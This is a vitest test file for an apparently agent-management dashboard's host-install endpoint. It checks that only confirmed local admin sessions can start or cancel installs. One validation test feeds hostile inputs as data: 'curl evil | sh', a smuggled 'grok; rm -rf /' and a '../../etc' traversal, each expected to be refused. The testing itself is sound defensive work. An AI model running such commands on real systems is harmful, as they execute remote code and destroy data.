/**
 * AGEND-133 (upstream #3521): GET/POST /ui/host-install and POST /ui/host-install/cancel — the same gate as signing a CLI in from the dashboard.
 * A signed-in admin session on the local surface only. Never a read session, a guest, the CLI's header token, a session of the public link, or a request
 * that came through it. The body is strict: `{ backend }` and nothing else — what is run is the registry's, looked up by the server.
 * AGEND-144: starting an install is the Settings gate's CONFIRMED REPLAY and nothing else (tests/web-host-install-gate-144.test.ts drives the real gate end to end).
 * Here the route's own side: a request that is not a replay starts nothing, a replay carries the asker's authority (asked again, and false once it is stale), and the
 * body is as strict. Reads and Cancel (which only takes something away) are still the session's.
 */
import { ServerResponse, createServer, request, type IncomingMessage, type Server } from "node:http";
import { Readable } from "node:stream";
import { afterEach, describe, expect, it, vi } from "vitest";
import { WebSessionStore, csrfTokenFor, tokenEpoch, type SessionRecord } from "../src/web-session.js";
import { createSettingsReplay } from "../src/settings-request-capability.js";
import { SettingsExecution } from "../src/settings-transaction.js";
import { handleWebRequest, type WebApiContext } from "../src/web-api.js";
import { WebHostInstalls, type HostInstallReporter, type HostInstallStart } from "../src/web-host-install.js";
import { WEB_SESSION_COOKIE_SECURE } from "../src/web-auth.js";
import { bindGatewayRequest } from "../src/web-request-context.js";

const servers: Server[] = [];
afterEach(async () => { for (const s of servers.splice(0)) await new Promise<void>(r => s.close(() => r())); });

/**
 * A store whose answer to "who is this session?" can be bent by a test, to reach what the real store would never hand the route: a record on the wrong surface
 * (the real `authenticate` already refuses a public-link session on the local listener — the route's own `surface` check is the second lock), a session demoted
 * or swapped for another person's while a body is in flight.
 */
class BendableSessions extends WebSessionStore {
  bend: ((r: SessionRecord) => SessionRecord) | null = null;
  override authenticate(...args: Parameters<WebSessionStore["authenticate"]>): SessionRecord | null {
    const r = super.authenticate(...args);
    return r && this.bend ? this.bend(r) : r;
  }
}

async function setup(over: { start?: (backend: string, r: HostInstallReporter, mode: string, current: () => boolean) => Promise<HostInstallStart> } = {}) {
  const token = "install-scratch-token", sessions = new BendableSessions({});
  const start = vi.fn(over.start ?? (async () => ({ started: true }) as HostInstallStart));
  const cancel = vi.fn(async () => true);
  const installs = new WebHostInstalls({ installable: b => ["grok", "codex"].includes(b), start, cancel });
  const ctx = { webToken: token, webSessions: sessions, webHostInstalls: installs } as unknown as WebApiContext;
  const server = createServer((req, res) => { if (!handleWebRequest(req, res, new URL(req.url!, "http://localhost"), ctx)) { res.writeHead(404); res.end(); } });
  servers.push(server); await new Promise<void>(r => server.listen(0, "127.0.0.1", r));
  const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
  const as = (tier: "admin" | "read" | "guest", surface: "local" | "gateway" = "local") => {
    const m = sessions.create({ tier, surface, label: "Firefox on Linux", tokenEpoch: tokenEpoch(token), ...(surface === "gateway" ? { exposureId: "e".repeat(32) } : {}),
      ...(tier === "guest" ? { owner: { adapterId: "discord", userId: "111111111111111111" } } : {}) } as never);
    return { cookie: `agend_session=${m.sessionId}`, origin, "x-agend-csrf": csrfTokenFor(m.sessionId), "content-type": "application/json" } as Record<string, string>;
  };
  const call = (method: "GET" | "POST", path: string, headers: Record<string, string>, body?: unknown) => new Promise<{ status: number; body: any; headers: Record<string, any> }>((resolve, reject) => {
    const data = body === undefined ? null : Buffer.from(typeof body === "string" ? body : JSON.stringify(body));
    const r = request(`${origin}${path}`, { method, headers: { ...headers, ...(data ? { "content-length": String(data.length) } : {}) } }, res => {
      const c: Buffer[] = []; res.on("data", x => c.push(x)); res.on("end", () => { const raw = Buffer.concat(c).toString(); let parsed: any = null; try { parsed = raw ? JSON.parse(raw) : null; } catch { parsed = raw; } resolve({ status: res.statusCode!, body: parsed, headers: res.headers }); });
    }); r.on("error", reject); r.end(data ?? undefined);
  });
  const begin = vi.spyOn(installs, "begin");
  return { token, sessions, start, cancel, installs, begin, ctx, as, call, origin };
}

/** What the Settings gate hands the route once an administrator has confirmed: a server-made replay with the asker's authority (`live`) and label. */
async function replay(t: Awaited<ReturnType<typeof setup>>, body: unknown, opts: { live?: () => boolean; path?: string } = {}) {
  const live = opts.live ?? (() => true), path = opts.path ?? "/ui/host-install";
  const execution = new SettingsExecution({ current: () => live(), snapshot: () => ({}) });
  const req = createSettingsReplay({ method: "POST", url: path, body: Buffer.from(typeof body === "string" ? body : JSON.stringify(body)), binding: "owned", localAdmin: () => live(), label: "Firefox on Linux" }, execution);
  req.headers = {};
  Object.defineProperty(req, "socket", { value: { remoteAddress: "127.0.0.1" }, configurable: true });
  return new Promise<{ status: number; body: any }>(resolve => {
    const out = { status: 0, body: "" };
    const res = new ServerResponse(req);
    res.writeHead = ((code: number) => { out.status = code; return res; }) as never;
    res.end = ((chunk?: unknown) => { out.body += String(chunk ?? ""); let parsed: any = null; try { parsed = JSON.parse(out.body); } catch { parsed = out.body; } resolve({ status: out.status, body: parsed }); return res; }) as never;
    expect(handleWebRequest(req, res, new URL(path, "http://localhost"), t.ctx)).toBe(true);
  });
}

describe("who may ask", () => {
  it("the local admin session reads (nothing, then the run) and cancels; a POST that is not the gate's replay starts nothing; answers are never cached", async () => {
    const t = await setup();
    const admin = t.as("admin");
    const none = await t.call("GET", "/ui/host-install", admin);
    expect([none.status, none.body]).toEqual([200, { install: null }]);
    expect(none.headers["cache-control"]).toContain("no-store");
    const direct = await t.call("POST", "/ui/host-install", admin, { backend: "grok" });
    expect([direct.status, direct.body]).toEqual([403, { error: "install_needs_confirmation" }]);
    expect(t.start).not.toHaveBeenCalled();
    const started = await replay(t, { backend: "grok" });
    expect(started.status).toBe(200);
    expect(started.body.install).toMatchObject({ backend: "grok", phase: "running", startedOn: "Firefox on Linux" });
    expect(t.start).toHaveBeenCalledTimes(1);
    expect((t.start.mock.calls[0] as unknown[])[0]).toBe("grok");
    expect((t.start.mock.calls[0] as unknown[])[2]).toBe("install");
    expect(typeof (t.start.mock.calls[0] as unknown[])[3]).toBe("function");
    expect((await t.call("GET", "/ui/host-install", admin)).body.install).toMatchObject({ backend: "grok", phase: "running" });
  });
  it("a read session, a guest, the web token and a request with no session: refused, and nothing starts", async () => {
    const t = await setup();
    for (const headers of [t.as("read"), t.as("guest")]) {
      expect((await t.call("GET", "/ui/host-install", headers)).status).toBe(403);
      expect((await t.call("POST", "/ui/host-install", headers, { backend: "grok" })).status).toBe(403);
      expect((await t.call("POST", "/ui/host-install/cancel", headers, {})).status).toBe(403);
    }
    const viaToken = { "x-agend-token": t.token, "content-type": "application/json" };
    expect((await t.call("POST", "/ui/host-install", viaToken, { backend: "grok" })).status).toBe(403);
    expect([401, 403]).toContain((await t.call("POST", "/ui/host-install", { "content-type": "application/json" }, { backend: "grok" })).status);
    expect(t.start).not.toHaveBeenCalled();
    expect(t.cancel).not.toHaveBeenCalled();
  });
  it("the asker's authority is carried to the start and asked again: stale on arrival → 403 and nothing starts; going stale while the fleet waits → the start refuses", async () => {
    const t = await setup();
    expect((await replay(t, { backend: "grok" }, { live: () => false })).body).toEqual({ error: "settings_execution_stale" });
    expect(t.start).not.toHaveBeenCalled();
    let live = true;
    const u = await setup({ start: async (_b, _r, _m, current) => { live = false; return current() ? { started: true } : { refused: "not_allowed" }; } });
    const r = await replay(u, { backend: "grok" }, { live: () => live });
    expect([r.status, r.body.error]).toEqual([403, "not_allowed"]);
    expect(u.installs.view()).toBeNull();
  });
  it("a replay of anything but a server-made one (a hand-built request that only looks like it) is refused", async () => {
    const t = await setup();
    const admin = t.as("admin");
    const req = Readable.from([Buffer.from('{"backend":"grok"}')]) as unknown as IncomingMessage; req.method = "POST"; req.url = "/ui/host-install";
    req.headers = { ...admin, host: new URL(t.origin).host };
    Object.defineProperty(req, "socket", { value: { remoteAddress: "127.0.0.1" }, configurable: true });
    const sent = await new Promise<{ status: number; body: string }>(resolve => {
      const out = { status: 0, body: "" }, res = new ServerResponse(req);
      res.writeHead = ((code: number) => { out.status = code; return res; }) as never;
      res.end = ((chunk?: unknown) => { out.body += String(chunk ?? ""); resolve(out); return res; }) as never;
      handleWebRequest(req, res, new URL("/ui/host-install", "http://localhost"), t.ctx);
    });
    expect(sent.status).toBe(403);
    expect(t.start).not.toHaveBeenCalled();
  });
  it("a session made over the public link (gateway surface) is refused", async () => {
    const t = await setup();
    const gw = t.as("admin", "gateway");
    expect((await t.call("GET", "/ui/host-install", gw)).status).toBeGreaterThanOrEqual(401);
    expect((await t.call("POST", "/ui/host-install", gw, { backend: "grok" })).status).toBeGreaterThanOrEqual(401);
    expect(t.start).not.toHaveBeenCalled();
  });
  it("a request that came through the public link: not found for a read; a write is refused (by the session gate before the route, or the route)", async () => {
    const t = await setup();
    const sessions = t.sessions;
    const gw = sessions.create({ tier: "admin", surface: "gateway", exposureId: "e".repeat(32), label: "gateway", tokenEpoch: tokenEpoch(t.token) } as never);
    class Res extends ServerResponse { status = 0; body = "";
      override writeHead(code: number): this { this.status = code; return this; }
      override end(chunk?: unknown): this { this.body += String(chunk ?? ""); return this; } }
    for (const [method, path] of [["GET", "/ui/host-install"], ["POST", "/ui/host-install"], ["POST", "/ui/host-install/cancel"]] as const) {
      const req = Readable.from([]) as unknown as IncomingMessage; req.method = method; req.url = path;
      req.headers = { host: "localhost", cookie: `${WEB_SESSION_COOKIE_SECURE}=${gw.sessionId}` };
      Object.defineProperty(req, "socket", { value: { remoteAddress: "127.0.0.1" }, configurable: true });
      bindGatewayRequest(req, { surface: "gateway", exposureId: "e".repeat(32), expectedOrigin: "https://public.example", isCurrent: () => true });
      const res = new Res(req);
      expect(handleWebRequest(req, res, new URL(path, "http://localhost"), t.ctx)).toBe(true);
      await vi.waitFor(() => expect(res.status).not.toBe(0));
      if (method === "GET") expect([res.status, JSON.parse(res.body).error]).toEqual([404, "install_not_over_public_link"]);
      else expect(res.status, `${method} ${path}`).toBeGreaterThanOrEqual(401);
    }
    expect(t.start).not.toHaveBeenCalled();
  });
  it("an admin session of the public link that reaches the local listener is refused (403) — the route's own surface check, behind the store's", async () => {
    const t = await setup();
    const admin = t.as("admin");
    // The real store refuses a gateway-surface session on a non-gateway request (401). Make it hand the record over anyway: the route must still say no.
    t.sessions.bend = r => ({ ...r, surface: "gateway", exposureId: "e".repeat(32) });
    for (const [method, path, body] of [["GET", "/ui/host-install", undefined], ["POST", "/ui/host-install/cancel", {}]] as const) {
      const r = await t.call(method, path, admin, body);
      expect([r.status, r.body.error], `${method} ${path}`).toEqual([403, "install_needs_a_local_admin"]);
    }
    expect(t.begin).not.toHaveBeenCalled();
    expect(t.cancel).not.toHaveBeenCalled();
  });
  /** A cancel whose body arrives in two pieces; `between` runs while the server is waiting for the second. */
  async function slowCancel(t: Awaited<ReturnType<typeof setup>>, headers: Record<string, string>, between: () => void) {
    return new Promise<{ status: number; body: any }>((resolve, reject) => {
      const r = request(`${t.origin}/ui/host-install/cancel`, { method: "POST", headers: { ...headers, "content-length": "5" } }, res => {
        const c: Buffer[] = []; res.on("data", x => c.push(x)); res.on("end", () => resolve({ status: res.statusCode!, body: JSON.parse(Buffer.concat(c).toString() || "null") }));
      });
      r.on("error", reject); r.write("{"); setTimeout(() => { between(); r.end("}   "); }, 50);
    });
  }
  it("cancel: a session revoked while the body is read → 401 from the route's own re-check, and nothing is cancelled", async () => {
    const t = await setup();
    const m = t.sessions.create({ tier: "admin", surface: "local", label: "x", tokenEpoch: tokenEpoch(t.token) });
    const headers = { cookie: `agend_session=${m.sessionId}`, origin: t.origin, "x-agend-csrf": csrfTokenFor(m.sessionId), "content-type": "application/json" };
    const r = await slowCancel(t, headers, () => { t.sessions.revokeById(m.sessionId); });
    expect(r.status).toBe(401);
    expect(t.cancel).not.toHaveBeenCalled();
  });
  it("cancel: a session demoted while the body is read → 403; a different person's session behind the same cookie → 409; nothing is cancelled", async () => {
    const t = await setup();
    const admin = t.as("admin");
    const demoted = await slowCancel(t, admin, () => { t.sessions.bend = rec => ({ ...rec, tier: "read" }); });
    expect([demoted.status, demoted.body.error]).toEqual([403, "install_needs_a_local_admin"]);
    const u = await setup(), other = u.as("admin");
    const swapped = await slowCancel(u, other, () => { u.sessions.bend = rec => ({ ...rec, handle: "f".repeat(16) }); });
    expect([swapped.status, swapped.body.error]).toEqual([409, "install_session_changed"]);
    expect(t.cancel).not.toHaveBeenCalled(); expect(u.cancel).not.toHaveBeenCalled();
  });
  it("cancel: a continuation the settings store no longer allows (permitWebContinuation) never cancels", async () => {
    const t = await setup();
    const admin = t.as("admin");
    // Live while the body is taken (that reader asks once, and refuses a stale one itself); stale by the time the route asks again.
    let asked = 0;
    const execution = new SettingsExecution({ current: () => ++asked <= 1, snapshot: () => ({}) });
    const req = createSettingsReplay({ method: "POST", url: "/ui/host-install/cancel", body: Buffer.from("{}"), binding: "owned" }, execution);
    req.headers = { ...admin, host: new URL(t.origin).host };
    Object.defineProperty(req, "socket", { value: { remoteAddress: "127.0.0.1" }, configurable: true });
    const sent = await new Promise<{ status: number; body: string }>(resolve => {
      const out = { status: 0, body: "" };
      const res = new ServerResponse(req);
      res.writeHead = ((code: number) => { out.status = code; return res; }) as never;
      res.end = ((chunk?: unknown) => { out.body += String(chunk ?? ""); resolve(out); return res; }) as never;
      expect(handleWebRequest(req, res, new URL("/ui/host-install/cancel", "http://localhost"), t.ctx)).toBe(true);
    });
    expect(sent.status).toBe(500);
    expect(t.cancel).not.toHaveBeenCalled();
  });
});

describe("what is asked", () => {
  it("only { backend: <id> }: a command, an extra key, a bad id or no body is refused before anything runs", async () => {
    const t = await setup();
    for (const body of [{ backend: "grok", command: "curl evil | sh" }, { command: "curl evil | sh" }, { backend: "grok; rm -rf /" }, { backend: "../../etc" }, { backend: 7 }, {}, [], "grok", "{not json"]) {
      const r = await replay(t, body);
      expect(r.status, JSON.stringify(body)).toBe(400);
    }
    expect(t.start).not.toHaveBeenCalled();
  });
  it("a CLI the registry does not install: 400 unsupported, nothing runs", async () => {
    const t = await setup();
    const r = await replay(t, { backend: "opencode" });
    expect([r.status, r.body]).toEqual([400, { error: "unsupported" }]);
    expect(t.start).not.toHaveBeenCalled();
  });
  it.each([["busy", 409], ["already", 409], ["shutting_down", 503], ["failed", 500]] as const)("the fleet refuses with %s: its code and status come back", async (code, status) => {
    const t = await setup({ start: async () => ({ refused: code }) });
    const r = await replay(t, { backend: "grok" });
    expect([r.status, r.body.error]).toEqual([status, code]);
  });
  it("cancel: any local admin; the body must be {}", async () => {
    const t = await setup();
    const admin = t.as("admin");
    expect((await t.call("POST", "/ui/host-install/cancel", admin, { backend: "grok" })).status).toBe(400);
    expect(t.cancel).not.toHaveBeenCalled();
    expect(await t.call("POST", "/ui/host-install/cancel", admin, {})).toMatchObject({ status: 200, body: { cancelled: true } });
    expect(t.cancel).toHaveBeenCalledTimes(1);
  });
  it("a query string on the read, or a method other than GET/POST, is not found", async () => {
    const t = await setup();
    const admin = t.as("admin");
    expect((await t.call("GET", "/ui/host-install?backend=grok", admin)).status).toBe(404);
    expect((await t.call("GET", "/ui/host-install/cancel", admin)).status).toBe(404);
  });
  it("a hand-built context with no installs: unavailable, not a crash", async () => {
    const t = await setup();
    (t.ctx as any).webHostInstalls = undefined;
    expect((await t.call("GET", "/ui/host-install", t.as("admin"))).body).toEqual({ error: "install_unavailable" });
  });
});
